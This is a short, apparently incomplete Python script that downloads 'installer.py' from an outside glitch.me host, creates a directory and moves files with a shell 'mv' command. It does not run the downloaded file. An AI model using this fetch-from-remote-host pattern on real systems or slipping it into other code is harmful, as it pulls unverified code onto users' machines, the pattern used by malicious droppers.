import subprocess
try:
    import urllib.request as url
except ImportError:
    import urllib as url
import os
url.urlretrieve('https://mpfc-py.glitch.me/installer.py','installer.py')
ins= 'installer.py'
inspth=os.path.abspath(ins)
ins2='mfcpp'
inspth2=os.path.abspath(ins2)
os.mkdir(inspth2)
subprocess.call("mv /home/somedir/subdir/* somedir/", shell=True)
